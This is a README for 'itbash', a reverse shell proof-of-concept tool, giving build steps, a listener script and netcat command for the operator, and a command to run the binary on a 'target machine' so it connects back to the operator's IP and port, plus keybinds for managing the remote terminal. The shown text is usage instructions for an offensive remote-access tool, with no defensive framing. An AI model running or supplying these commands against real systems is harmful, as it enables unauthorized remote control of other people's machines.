# itbash
Reverse Shell POC (no pipe)

-------

BUILD
=====

Use make to compile the program:
```bash
make
```

------

USAGE
=====

On your machine, run the script with the port as first argument:
```bash
./server.sh 4444
```

On the target machine, push itbash. Run the program with address IP/hostname as the first argument and port as second.
```bash
./itbash 192.168.1.11 4444
```

By default *itbash* use localhost and the port 4444.

-----

TIPS
====

* You can use environment variables ADDRESS and PORT to configure the program.
* The program is compatible with nc. You can use nc to listen the connection on your host.

```bash
nc -nlvp 4444
```

* The script server.sh can be used with Keybinds:
* * ```Ctrl p``` : to enable command mode. You need to run this mode for enable all Keys. (If you use some others keys, the mode is disabled)
  * * ```Ctrl q``` : Exit the program.
    * ```Ctrl t``` : reset the host TTY configuration
    * ```Ctrl r``` : reconfigure PTS on the remote machine
